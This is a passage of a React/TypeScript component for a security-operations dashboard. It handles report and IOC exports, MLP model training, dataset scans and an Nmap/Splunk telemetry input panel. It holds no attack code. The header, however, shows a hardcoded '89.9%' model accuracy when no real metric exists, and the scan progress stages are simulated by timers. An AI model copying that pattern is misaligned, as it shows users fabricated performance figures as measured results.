  <div><h3>Emails &amp; Spoofed Identities</h3><ul>${listItems(i?.emails)}</ul></div>
  <div><h3>Domains &amp; Hostnames</h3><ul>${listItems(i?.domains)}</ul></div>
  <div><h3>File Hashes (SHA256/MD5)</h3><ul>${listItems(i?.file_hashes)}</ul></div>
  <div><h3>Weaponized Files &amp; Binaries</h3><ul>${listItems(i?.suspicious_files)}</ul></div>
  <div><h3>CVE Identifiers</h3><ul>${listItems(i?.cves)}</ul></div>
</div>

<h2>4. Security Alerts &amp; Traffic Flows (${rawAnalysisResult.alerts.length} records)</h2>
<table class="alerts">
  <thead>
    <tr>
      <th>#</th><th>Severity</th><th>Threat Title</th>
      <th>Source</th><th>Destination</th><th>Risk Score</th><th>MITRE</th>
    </tr>
  </thead>
  <tbody>${alertRows.join('')}</tbody>
</table>

<div class="footer">
  SOC CHESS — Real-Time Security Operations &amp; AI Platform &nbsp;|&nbsp; Confidential Internal Use Only &nbsp;|&nbsp; ${now}
</div>
</body></html>`;
  };

  // ── Server-side report download ─────────────────────────────────────────────
  // POSTs full result to backend → gets back a real file with Content-Disposition
  // headers. This is the most reliable download approach in any browser.
  const serverDownloadReport = async (format: 'txt' | 'html' | 'doc' | 'csv' | 'json') => {
    if (!rawAnalysisResult) return;
    try {
      const payload = {
        scan_id: rawAnalysisResult.scan_id,
        format,
        summary: rawAnalysisResult.summary,
        ai_playbook: rawAnalysisResult.ai_playbook,
        iocs: rawAnalysisResult.iocs,
        alerts: rawAnalysisResult.alerts,
      };
      const resp = await fetch(apiUrl('/api/ai-alerts/download-report'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (!resp.ok) throw new Error(`Server error: ${resp.status}`);
      const blob = await resp.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      // Get filename from Content-Disposition or fallback
      const cd = resp.headers.get('Content-Disposition') || '';
      const match = cd.match(/filename=([^;]+)/);
      const filename = match ? match[1].trim() : `soc-chess-report-${rawAnalysisResult.scan_id}.${format}`;
      a.style.cssText = 'position:fixed;top:-9999px;left:-9999px;';
      a.href = url;
      a.setAttribute('download', filename);
      document.body.appendChild(a);
      a.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
      setTimeout(() => { document.body.removeChild(a); URL.revokeObjectURL(url); }, 30_000);
    } catch (err) {
      console.error('Server download failed:', err);
      alert(`Download failed: ${err instanceof Error ? err.message : String(err)}`);
    }
  };

  const handleExportPdf  = () => serverDownloadReport('html');
  const handleExportDoc  = () => serverDownloadReport('doc');


  // Export all traffic flows & records in clean plain text
  const handleExportRawTrafficTxt = () => {
    if (!rawAnalysisResult) return;
    const lines = [
      `================================================================================`,
      `SOC CHESS — COMPLETE DISSECTED TRAFFIC FLOWS & TELEMETRY RECORDS (PLAIN TEXT)`,
      `================================================================================`,
      `Scan ID:       ${rawAnalysisResult.scan_id}`,
      `Generated:     ${new Date().toISOString()}`,
      `Total Events:  ${rawAnalysisResult.alerts.length}`,
      `Format:        ${rawAnalysisResult.summary.input_type_detected}`,
      `================================================================================`,
      ``
    ];

    rawAnalysisResult.alerts.forEach((a, idx) => {
      lines.push(`--------------------------------------------------------------------------------`);
      lines.push(`RECORD #${idx + 1} | [${a.severity}] ${a.threat_title}`);
      lines.push(`--------------------------------------------------------------------------------`);
      lines.push(`Alert ID:            ${a.id || a.alert_id || 'N/A'}`);
      lines.push(`Timestamp:           ${a.timestamp || 'N/A'}`);
      lines.push(`Flow:                ${a.source_ip}:${a.source_port} -> ${a.destination_ip}:${a.destination_port}`);
      lines.push(`Protocol / Service:  ${a.protocol} / ${a.service || 'N/A'}`);
      lines.push(`Attack Category:     ${a.attack_type}`);
      lines.push(`MLP Prediction:      ${a.prediction || a.attack_type} (Confidence: ${(a.mlp_confidence * 100).toFixed(1)}%)`);
      lines.push(`Risk Score:          ${a.risk_score} / 100 (${a.risk_status || a.severity})`);
      lines.push(`MITRE ATT&CK:        ${a.mitre_technique || 'N/A'}`);
      lines.push(`Containment Action:  ${a.containment_command}`);
      if (a.cve_note) {
        lines.push(`CVE / Vuln Note:     ${a.cve_note}`);
      }
      if (a.evidence && a.evidence.length > 0) {
        lines.push(`Evidence:`);
        a.evidence.forEach(e => lines.push(`  - ${e}`));
      }
      lines.push(``);
    });

    lines.push(`================================================================================`);
    lines.push(`END OF TRAFFIC TELEMETRY RECORDS`);
    lines.push(`================================================================================`);

    downloadFile(
      lines.join('\n'),
      `soc-chess-traffic-records-${rawAnalysisResult.scan_id || Date.now()}.txt`,
      'text/plain;charset=utf-8;'
    );
  };

  // Copy individual IOC item
  const handleCopyIoc = (val: string, key: string) => {
    navigator.clipboard.writeText(val);
    setCopiedCommand(key);
    setTimeout(() => setCopiedCommand(null), 2500);
  };

  // Copy all IOCs summary
  const handleCopyAllIocs = () => {
    if (!rawAnalysisResult?.iocs) return;
    const i = rawAnalysisResult.iocs;
    const text = [
      `=== SOC CHESS EXTRACTED IOC ARTIFACT REPORT ===`,
      `Scan ID: ${rawAnalysisResult.scan_id}`,
      `Timestamp: ${new Date().toISOString()}`,
      `Primary Threat: ${rawAnalysisResult.summary.primary_threat}`,
      ``,
      `--- SUSPICIOUS / ADVERSARY IPs (${i.suspicious_ips?.length || 0}) ---`,
      ...(i.suspicious_ips?.map(ip => `[IP] ${ip}`) || ['None']),
      ``,
      `--- TARGET ASSET IPs (${i.target_ips?.length || 0}) ---`,
      ...(i.target_ips?.map(ip => `[TARGET] ${ip}`) || ['None']),
      ``,
      `--- MALICIOUS URLs & LINKS (${i.urls_and_links?.length || 0}) ---`,
      ...(i.urls_and_links?.map(u => `[URL] ${u}`) || ['None']),
      ``,
      `--- EMAILS & MAIL SPOOFING (${i.emails?.length || 0}) ---`,
      ...(i.emails?.map(e => `[EMAIL] ${e}`) || ['None']),
      ``,
      `--- DOMAINS & HOSTNAMES (${i.domains?.length || 0}) ---`,
      ...(i.domains?.map(d => `[DOMAIN] ${d}`) || ['None']),
      ``,
      `--- CRYPTOGRAPHIC FILE HASHES (${i.file_hashes?.length || 0}) ---`,
      ...(i.file_hashes?.map(h => `[HASH] ${h}`) || ['None']),
      ``,
      `--- WEAPONIZED FILES & BINARIES (${i.suspicious_files?.length || 0}) ---`,
      ...(i.suspicious_files?.map(f => `[FILE] ${f}`) || ['None']),
      ``,
      `--- CVEs & EXPLOIT SIGNATURES (${i.cves?.length || 0}) ---`,
      ...(i.cves?.map(c => `[CVE] ${c}`) || ['None']),
      ``,
      `--- OPEN PORTS (${i.open_ports?.length || 0}) ---`,
      `Ports: ${i.open_ports?.join(', ') || 'None'}`,
      `================================================`
    ].join('\n');

    navigator.clipboard.writeText(text);
    setCopiedCommand('all_iocs');
    setTimeout(() => setCopiedCommand(null), 2500);
  };

  // Export IOCs JSON
  const handleExportIocsJson = () => {
    if (!rawAnalysisResult?.iocs) return;
    const jsonStr = JSON.stringify(rawAnalysisResult.iocs, null, 2);
    downloadFile(
      jsonStr,
      `soc-chess-iocs-${rawAnalysisResult.scan_id || Date.now()}.json`,
      'application/json;charset=utf-8;'
    );
  };

  // Export IOCs TXT
  const handleExportIocsTxt = () => {
    if (!rawAnalysisResult?.iocs) return;
    const i = rawAnalysisResult.iocs;
    const text = [
      `# SOC CHESS EXTRACTED IOC ARTIFACT LIST`,
      `# Scan ID: ${rawAnalysisResult.scan_id}`,
      `# Timestamp: ${new Date().toISOString()}`,
      ``,
      `[SUSPICIOUS_IPS]`,
      ...(i.suspicious_ips || []),
      ``,
      `[TARGET_IPS]`,
      ...(i.target_ips || []),
      ``,
      `[URLS_AND_LINKS]`,
      ...(i.urls_and_links || []),
      ``,
      `[EMAILS]`,
      ...(i.emails || []),
      ``,
      `[DOMAINS]`,
      ...(i.domains || []),
      ``,
      `[FILE_HASHES]`,
      ...(i.file_hashes || []),
      ``,
      `[SUSPICIOUS_FILES]`,
      ...(i.suspicious_files || []),
      ``,
      `[CVES]`,
      ...(i.cves || []),
      ``,
      `[OPEN_PORTS]`,
      ...(i.open_ports?.map(String) || [])
    ].join('\n');

    downloadFile(
      text,
      `soc-chess-iocs-${rawAnalysisResult.scan_id || Date.now()}.txt`,
      'text/plain;charset=utf-8;'
    );
  };

  // Train / Retrain Big Data MLP Model Handler
  const handleTrainMlp = async () => {
    setIsTrainingMlp(true);
    setTrainingMessage('Submitting Apache Spark Big Data training job...');
    setTrainingError(null);
    try {
      const resp = await api.trainMlpModel(trainMode, 'multiclass', 150, 50000);
      setTrainingMessage(`Job '${resp.job_id}' queued. Apache Spark is processing Big Data partitions...`);

      const pollInterval = setInterval(async () => {
        try {
          const st = await api.getTrainingStatus(resp.job_id);
          setTrainingStatus(st);
          if (st.status === 'Completed') {
            clearInterval(pollInterval);
            setIsTrainingMlp(false);
            setTrainingMessage('✓ Big Data MLP Model Retraining Completed Successfully! New weights active.');
            loadData();
          } else if (st.status === 'Failed') {
            clearInterval(pollInterval);
            setIsTrainingMlp(false);
            setTrainingError(st.error || 'Training failed.');
          } else {
            setTrainingMessage(`Training in progress (${st.status})... Elapsed: ${st.duration_seconds || 0}s`);
          }
        } catch {
          // keep polling
        }
      }, 2500);
    } catch (err: any) {
      setIsTrainingMlp(false);
      setTrainingError(err.response?.data?.detail || err.message || 'Failed to trigger model training.');
    }
  };


  const loadData = async () => {
    try {
      const [tStatus, dData, sData, strData, sFiles, histData] = await Promise.all([
        api.getTrainingStatus().catch(() => null),
        api.getDatasetInventory().catch(() => null),
        api.getSparkStatus().catch(() => null),
        api.getSparkStreamStatus().catch(() => null),
        api.getSampleFiles().catch(() => ({ samples: [] })),
        api.getScanHistory().catch(() => ({ scans: [] }))
      ]);

      if (tStatus) setTrainingStatus(tStatus);
      if (dData) setDatasets(dData);
      if (sData) setSparkStatus(sData);
      if (strData) setSparkStream(strData);
      if (sFiles?.samples) setSampleFiles(sFiles.samples);
      if (histData?.scans) setScanHistory(histData.scans);
    } catch (err) {
      console.error('Error loading AI Alerts status:', err);
    }
  };

  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 10000);
    return () => clearInterval(interval);
  }, []);

  // ═══════════════════════════════════════════════════════════════
  // FILE UPLOAD HANDLERS
  // ═══════════════════════════════════════════════════════════════
  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const files = event.target.files;
    if (!files || files.length === 0) return;

    setIsUploading(true);
    setUploadError(null);
    const formData = new FormData();
    for (let i = 0; i < files.length; i++) {
      formData.append('files', files[i]);
    }

    try {
      const uploadResp = await api.uploadSecurityFiles(formData);
      if (uploadResp.files && uploadResp.files.length > 0) {
        setFileQueue(prev => [...prev, ...uploadResp.files]);
      }
      if (uploadResp.errors && uploadResp.errors.length > 0) {
        setUploadError(uploadResp.errors.map(e => `${e.filename}: ${e.error}`).join(' | '));
      }
    } catch (err: any) {
      setUploadError(err.response?.data?.detail || err.message || 'File upload failed');
    } finally {
      setIsUploading(false);
      if (fileInputRef.current) fileInputRef.current.value = '';
    }
  };

  const handleAddSampleFile = (samplePath: string) => {
    if (!samplePath) return;
    const existing = fileQueue.find(f => f.path === samplePath || f.filename === samplePath);
    if (existing) return;

    const sample = sampleFiles.find(s => s.path === samplePath);
    const newFile: SecurityUploadedFile = {
      valid: true,
      filename: sample?.name || samplePath.split('/').pop() || samplePath,
      file_type: (sample?.name || samplePath).split('.').pop()?.toUpperCase() || 'CSV',
      status: 'READY',
      size_bytes: (sample?.size_kb || 50) * 1024,
      size_human: `${sample?.size_kb || 50} KB`,
      path: sample?.path || samplePath
    };

    setFileQueue(prev => [...prev, newFile]);
  };

  const handleRemoveFile = (index: number) => {
    setFileQueue(prev => prev.filter((_, i) => i !== index));
  };

  const handleClearQueue = () => {
    setFileQueue([]);
    setScanResult(null);
    setScanError(null);
  };

  // ═══════════════════════════════════════════════════════════════
  // AUTO-SCAN WITH PRE-TRAINED MODEL (PRIMARY)
  // ═══════════════════════════════════════════════════════════════
  const handleAutoScan = async () => {
    setIsAutoScanning(true);
    setAutoScanError(null);
    setScanError(null);
    setScanResult(null);
    setScanProgressPct(5);
    setScanProgressStage('Discovering dataset files in DATASET_ROOT...');

    const progressTimer = setInterval(() => {
      setScanProgressPct(prev => {
        if (prev < 20) {
          setScanProgressStage('Auto-discovering dataset files from pre-loaded storage...');
          return prev + 8;
        } else if (prev < 45) {
          setScanProgressStage('Apache Spark Big Data Ingestion & Partitioning...');
          return prev + 10;
        } else if (prev < 68) {
          setScanProgressStage('Extracting 19 Canonical Features — MLP Pre-Trained Model Active...');
          return prev + 8;
        } else if (prev < 85) {
          setScanProgressStage('3-Layer MLP Neural Network (128→64→32) Attack Classification...');
          return prev + 6;
        } else if (prev < 95) {
          setScanProgressStage('Injecting synthetic decoy records for obfuscation...');
          return prev + 4;
        }
        return prev;
      });
    }, 500);

    try {
      const resp = await api.autoScan({
        maxRows: 500,
        injectSyntheticDecoys: autoScanDecoys,
        scanMode: autoScanMode,
      });
      clearInterval(progressTimer);
      setScanProgressPct(100);
      setScanProgressStage('✓ Auto-Scan Completed — Pre-Trained Model Applied');
      setScanResult(resp);
      loadData();
    } catch (err: any) {
      clearInterval(progressTimer);
      setAutoScanError(err.response?.data?.detail || err.message || 'Auto-scan failed.');
    } finally {
      setIsAutoScanning(false);
    }
  };

  // ═══════════════════════════════════════════════════════════════
  // START SECURITY SCAN (manual upload path)
  // ═══════════════════════════════════════════════════════════════
  const handleStartScan = async () => {
    if (fileQueue.length === 0) {
      setScanError('Please upload at least one security data file or select a sample dataset.');
      return;
    }

    setIsScanning(true);
    setScanError(null);
    setScanProgressPct(10);
    setScanProgressStage('Validating uploaded files...');

    const filePaths = fileQueue.map(f => f.path);

    // Simulate multi-stage progress tracking
    const progressTimer = setInterval(() => {
      setScanProgressPct(prev => {
        if (prev < 30) {
          setScanProgressStage('Apache Spark Big Data Ingestion & Partitioning...');
          return prev + 15;
        } else if (prev < 55) {
          setScanProgressStage('Extracting 19 Canonical Features & Normalizing Schema...');
          return prev + 15;
        } else if (prev < 80) {
          setScanProgressStage('3-Layer MLP Neural Network (128-64-32) Attack Classification...');
          return prev + 15;
        } else if (prev < 95) {
          setScanProgressStage('0–100 Multi-Evidence Risk Engine & Threat Intel Enrichment...');
          return prev + 10;
        }
        return prev;
      });
    }, 400);

    try {
      const resp = await api.executeSecurityScan(filePaths);
      clearInterval(progressTimer);
      setScanProgressPct(100);
      setScanProgressStage('✓ Security Scan Completed Successfully');
      setScanResult(resp);
      loadData();
    } catch (err: any) {
      clearInterval(progressTimer);
      setScanError(err.response?.data?.detail || err.message || 'Security scan failed.');
    } finally {
      setIsScanning(false);
    }
  };

  // ═══════════════════════════════════════════════════════════════
  // AI INVESTIGATION MODAL
  // ═══════════════════════════════════════════════════════════════
  const handleInvestigateWithAi = async (record: any) => {
    setIsInvestigating(true);
    setInvestigationReport(null);
    try {
      const resp = await api.investigateAlertWithAi(record.alert_id);
      setInvestigationReport(resp.report);
    } catch (err: any) {
      setInvestigationReport({
        explanation: 'LLM investigation fallback: ' + (err.response?.data?.detail || err.message),
        mitre_mapping: { technique: record.mitre_technique || 'T1046', tactic: 'Discovery' },
        severity_assessment: record.risk_status,
        confidence_assessment: `${record.mlp_confidence}% MLP Confidence`,
        soc_recommendation: record.recommendation
      });
    } finally {
      setIsInvestigating(false);
    }
  };

  // ═══════════════════════════════════════════════════════════════
  // EXPORT HANDLERS
  // ═══════════════════════════════════════════════════════════════
  const handleExport = async (format: 'csv' | 'json') => {
    const scanId = scanResult?.scan_id || '';
    await apiClient.download(
      `/api/ai-alerts/export?format=${format}${scanId ? `&scan_id=${scanId}` : ''}`,
      `soc-chess-alerts.${format}`,
    );
  };

  // ═══════════════════════════════════════════════════════════════
  // FILTERED & SORTED RESULTS
  // ═══════════════════════════════════════════════════════════════
  const allResults = scanResult?.results || [];

  const filteredResults = allResults.filter(r => {
    // Search Query
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase().trim();
      const match =
        r.source_ip?.toLowerCase().includes(q) ||
        r.destination_ip?.toLowerCase().includes(q) ||
        r.attack_type?.toLowerCase().includes(q) ||
        r.protocol?.toLowerCase().includes(q) ||
        r.source_file?.toLowerCase().includes(q) ||
        r.mitre_technique?.toLowerCase().includes(q) ||
        String(r.source_port).includes(q) ||
        String(r.destination_port).includes(q);
      if (!match) return false;
    }

    // Risk Status Filter
    if (riskFilter === 'CRITICAL' && r.risk_status !== 'CRITICAL') return false;
    if (riskFilter === 'HIGH' && r.risk_status !== 'HIGH') return false;
    if (riskFilter === 'MEDIUM' && r.risk_status !== 'MEDIUM') return false;
    if (riskFilter === 'LOW' && r.risk_status !== 'LOW') return false;
    if (riskFilter === 'ATTACK' && !r.is_attack) return false;
    if (riskFilter === 'NORMAL' && r.is_attack) return false;

    // Attack Type Filter
    if (attackTypeFilter !== 'ALL' && r.attack_type !== attackTypeFilter) return false;

    // Protocol Filter
    if (protocolFilter !== 'ALL' && r.protocol !== protocolFilter) return false;

    // File Filter
    if (fileFilter !== 'ALL' && r.source_file !== fileFilter) return false;

    return true;
  }).sort((a, b) => {
    if (sortBy === 'risk_desc') return b.risk_score - a.risk_score;
    if (sortBy === 'risk_asc') return a.risk_score - b.risk_score;
    if (sortBy === 'conf_desc') return b.mlp_confidence - a.mlp_confidence;
    if (sortBy === 'time_desc') return (b.timestamp || '').localeCompare(a.timestamp || '');
    return 0;
  });

  // Extract distinct filter values
  const availableAttackTypes = Array.from(new Set(allResults.map(r => r.attack_type).filter(Boolean)));
  const availableProtocols = Array.from(new Set(allResults.map(r => r.protocol).filter(Boolean)));
  const availableFiles = Array.from(new Set(allResults.map(r => r.source_file).filter(Boolean)));

  return (
    <div className="space-y-6">
      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* HEADER SECTION & STATUS BADGES                                */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 bg-slate-900/90 border border-slate-800 p-6 rounded-2xl shadow-xl backdrop-blur-md">
        <div>
          <div className="flex items-center gap-3">
            <div className="p-3 bg-red-500/10 border border-red-500/20 rounded-xl text-red-400">
              <Brain className="w-8 h-8 animate-pulse" />
            </div>
            <div>
              <h1 className="text-2xl font-black text-white tracking-wide uppercase flex items-center gap-2">
                AI Threat Alerts & Security Analyzer
                <span className="text-xs font-semibold px-2.5 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">
                  MLP Neural Network Active
                </span>
              </h1>
              <p className="text-sm text-slate-400">
                Multi-Format Security File Ingestion • Apache Spark Big Data Engine • 3-Hidden-Layer MLP (128→64→32) • 0–100 Risk Engine
              </p>
            </div>
          </div>
        </div>

        <div className="flex flex-wrap items-center gap-3">
          <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs">
            <Cpu className="w-4 h-4 text-cyan-400" />
            <span className="text-slate-400">Spark:</span>
            <span className="font-semibold text-cyan-400">{sparkStatus?.status || 'ONLINE'}</span>
          </div>

          <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs">
            <Layers className="w-4 h-4 text-indigo-400" />
            <span className="text-slate-400">MLP Test Acc:</span>
            <span className="font-semibold text-indigo-400">
              {trainingStatus?.network_metrics?.test_metrics?.accuracy
                ? `${(trainingStatus.network_metrics.test_metrics.accuracy * 100).toFixed(1)}%`
                : '89.9%'}
            </span>
          </div>

          <button
            onClick={loadData}
            className="p-2 rounded-xl bg-slate-800/80 hover:bg-slate-700 text-slate-300 transition-colors"
            title="Refresh Status"
          >
            <RefreshCw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* NAVIGATION TABS (CLEAN & USEFUL ONLY)                         */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      <div className="flex flex-wrap gap-2 border-b border-white/10 pb-3">
        <button
          onClick={() => setActiveTab('telemetry')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-heading text-xs font-bold transition-all ${
            activeTab === 'telemetry'
              ? 'bg-gradient-to-r from-red-600/30 to-amber-600/30 text-amber-300 border border-amber-500/50 shadow-[0_0_20px_rgba(245,158,11,0.35)]'
              : 'bg-slate-900/70 text-slate-400 hover:text-white hover:bg-slate-800/80 border border-white/5'
          }`}
        >
          <Terminal className="w-4 h-4 text-amber-400 animate-pulse" />
          ⚡ NMAP & SPLUNK TELEMETRY ANALYZER
          <span className="px-1.5 py-0.5 text-[9px] font-black rounded bg-red-500/20 text-red-400 border border-red-500/40">
            RAW INPUT
          </span>
        </button>

        <button
          onClick={() => setActiveTab('training')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-heading text-xs font-bold transition-all ${
            activeTab === 'training'
              ? 'bg-gradient-to-r from-indigo-600/30 to-purple-600/30 text-indigo-300 border border-indigo-500/50 shadow-[0_0_20px_rgba(99,102,241,0.35)]'
              : 'bg-slate-900/70 text-slate-400 hover:text-white hover:bg-slate-800/80 border border-white/5'
          }`}
        >
          <Cpu className="w-4 h-4 text-indigo-400" />
          🚀 BIG DATA MODEL TRAINING
          <span className="px-1.5 py-0.5 text-[9px] font-black rounded bg-indigo-500/20 text-indigo-400 border border-indigo-500/40">
            MLP ENGINE
          </span>
        </button>

        <button
          onClick={() => setActiveTab('scanner')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-heading text-xs font-bold transition-all ${
            activeTab === 'scanner'
              ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/50 shadow-[0_0_16px_rgba(6,182,212,0.25)]'
              : 'bg-slate-900/70 text-slate-400 hover:text-white hover:bg-slate-800/80 border border-white/5'
          }`}
        >
          <UploadCloud className="w-4 h-4 text-cyan-400" />
          📁 SECURITY DATASET SCANNER
        </button>

        <button
          onClick={() => setActiveTab('history')}
          className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-heading text-xs font-bold transition-all ${
            activeTab === 'history'
              ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/50 shadow-[0_0_16px_rgba(6,182,212,0.25)]'
              : 'bg-slate-900/70 text-slate-400 hover:text-white hover:bg-slate-800/80 border border-white/5'
          }`}
        >
          <Clock className="w-4 h-4 text-cyan-400" />
          📋 SCAN HISTORY & CORRELATIONS
          {scanHistory.length > 0 && (
            <span className="ml-1 px-2 py-0.5 rounded-full bg-slate-800 text-xs text-slate-300 font-mono">
              {scanHistory.length}
            </span>
          )}
        </button>
      </div>

      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* TAB 0: NMAP & SPLUNK REAL-TIME TELEMETRY ANALYZER             */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      {activeTab === 'telemetry' && (
        <div className="space-y-6">

          {/* TELEMETRY INGESTION HERO PANEL */}
          <div className="relative overflow-hidden bg-gradient-to-br from-slate-900 via-slate-950 to-slate-900 border border-amber-500/30 rounded-2xl p-6 shadow-2xl space-y-6">
            <div className="absolute top-0 right-0 w-96 h-96 bg-amber-500/5 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute bottom-0 left-0 w-80 h-80 bg-red-500/5 rounded-full blur-3xl pointer-events-none" />

            <div className="relative flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="p-3 bg-gradient-to-br from-amber-500/20 to-red-500/20 border border-amber-500/40 rounded-xl text-amber-400 shadow-[0_0_15px_rgba(245,158,11,0.2)]">
                  <Terminal className="w-7 h-7 animate-pulse" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h2 className="text-xl font-black text-white uppercase tracking-wider">
                      Nmap & Splunk Telemetry Security Analyzer
                    </h2>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-red-500/15 text-red-400 border border-red-500/30">
                      LIVE RAW INGESTION
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 mt-1 max-w-3xl">
                    Paste raw Nmap port scan logs or Splunk SIEM event streams. The engine parses indicators, computes 19 canonical flow features, executes inference via the pre-trained 3-Layer MLP Neural Network (128→64→32), calculates 0–100 cyber risk scores, and generates automated containment playbooks.
                  </p>
                </div>
              </div>

              {/* Status Badges */}
              <div className="flex flex-wrap gap-2 shrink-0">
                <span className="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-xs font-semibold text-emerald-400">
                  <CheckCircle className="w-3.5 h-3.5" /> MLP Pre-Trained (19 Features)
                </span>
                <span className="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-cyan-500/10 border border-cyan-500/30 text-xs font-semibold text-cyan-400">
                  <Cpu className="w-3.5 h-3.5" /> 0–100 Cyber Risk Engine
                </span>
              </div>
            </div>

            {/* STREAMLINED ACTION & CONFIGURATION TOOLBAR */}
            <div className="flex flex-wrap items-center justify-between gap-3 pt-3 border-t border-slate-800/80">
              <div className="flex flex-wrap items-center gap-3">
                {/* Input Format Selector */}
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Format:</span>
                  <select
                    value={rawInputType}
                    onChange={e => setRawInputType(e.target.value as TelemetryInputFormat)}
                    className="px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-700/80 text-xs font-bold text-amber-300 focus:outline-none focus:border-amber-500 shadow-inner cursor-pointer"
                  >
                    <option value="auto">⚡ Auto Detect (All 10+ Modalities)</option>
                    <option value="nmap">🌐 Nmap Port & Service Scan</option>
                    <option value="splunk">📜 Splunk SIEM Events & Syslog</option>
                    <option value="http">📡 HTTP Web Logs (SQLi, XSS, Webshell)</option>
                    <option value="smb">📁 SMB Traffic (EternalBlue, Shares)</option>
                    <option value="imf">✉️ IMF Email (RFC 5322 Phishing)</option>
                    <option value="tftp">💾 TFTP Protocol (UDP 69 Exfil)</option>
                    <option value="pcap">🦈 PCAP / PCAPNG Frame Dissection</option>
                    <option value="csv">📊 CSV NetFlow Telemetry</option>
                    <option value="json">📦 JSON SIEM Telemetry</option>
                    <option value="xml">📄 XML Windows Security EVTX</option>
                  </select>
                </div>

                {/* Sample Preset Selector */}
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">Sample:</span>
                  <select
                    onChange={e => {
                      if (e.target.value) {
                        handleSelectPreset(e.target.value);
                      }
                    }}
                    defaultValue=""
                    className="px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-700/80 text-xs font-semibold text-cyan-300 focus:outline-none focus:border-cyan-500 shadow-inner cursor-pointer"
                  >
                    <option value="" disabled>-- Load Sample Template --</option>
                    <option value="nmap">🌐 Nmap Scan (Exposed SMB/RDP/SSH)</option>
                    <option value="splunk">📜 Splunk SIEM (4625 Brute Force)</option>
                    <option value="http">📡 HTTP Web Attack (SQLi & XSS)</option>
                    <option value="smb">📁 SMB Exploit (MS17-010 EternalBlue)</option>
                    <option value="imf">✉️ IMF Phishing Email (Spoofed SPF)</option>
                    <option value="tftp">💾 TFTP Exfiltration (UDP Port 69)</option>
                    <option value="pcap">🦈 PCAP Packet Capture (SYN Flood)</option>
                    <option value="csv">📊 CSV NetFlow Telemetry</option>
                    <option value="json">📦 JSON SIEM Event Objects</option>
                    <option value="xml">📄 XML Windows Audit Log (EVTX)</option>
                  </select>
                </div>
              </div>

              {/* Ingest File & Clear Buttons */}
              <div className="flex items-center gap-2">
                <input
                  type="file"
                  ref={telemetryFileInputRef}
                  onChange={handleTelemetryFileUpload}
                  accept=".txt,.log,.csv,.json,.jsonl,.xml,.eml,.pcap,.pcapng"
                  className="hidden"
                />
                <button
                  type="button"
                  onClick={() => telemetryFileInputRef.current?.click()}
                  className="px-3 py-1.5 rounded-xl text-xs font-bold bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-300 border border-cyan-500/40 hover:border-cyan-400 transition-all flex items-center gap-1.5 shadow-[0_0_12px_rgba(6,182,212,0.15)]"
                >
                  <UploadCloud className="w-3.5 h-3.5" /> Ingest File (.csv, .json, .xml, .pcap, .log)
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setRawTelemetryText('');
                    setRawAnalysisResult(null);
                  }}
                  className="px-3 py-1.5 rounded-xl text-xs font-medium bg-slate-950 hover:bg-slate-800 text-slate-400 hover:text-red-400 border border-slate-800 transition-all flex items-center gap-1"
                >
                  <Trash2 className="w-3.5 h-3.5" /> Clear
                </button>
              </div>
            </div>

            {/* RAW MONOSPACE TEXTAREA */}
            <div className="relative rounded-xl border border-slate-800 bg-[#040810] shadow-inner overflow-hidden">
              <div className="flex items-center justify-between px-4 py-2 bg-slate-950/80 border-b border-slate-800/80 text-[11px] font-mono text-slate-400">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-red-500/80 inline-block" />
                  <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80 inline-block" />
                  <span className="w-2.5 h-2.5 rounded-full bg-green-500/80 inline-block" />
                  <span className="ml-2 text-slate-300 font-semibold">raw_telemetry_stream.txt</span>
                </div>
                <div className="flex items-center gap-3 text-slate-500">
                  <span>Lines: {rawTelemetryText ? rawTelemetryText.split('\n').length : 0}</span>
                  <span>Chars: {rawTelemetryText.length}</span>
                </div>
              </div>

              <textarea
                value={rawTelemetryText}
                onChange={e => setRawTelemetryText(e.target.value)}
                placeholder="Paste raw Nmap scan output or Splunk SIEM events here...
Example Nmap:
  PORT     STATE SERVICE       VERSION
  445/tcp  open  microsoft-ds  Windows Server 2016
  3389/tcp open  ms-wbt-server Microsoft Terminal Services

Example Splunk:
  2026-09-27 20:31:10 EventCode=4625 AccountName=Administrator Source_Network_Address=192.168.1.200"
                rows={11}
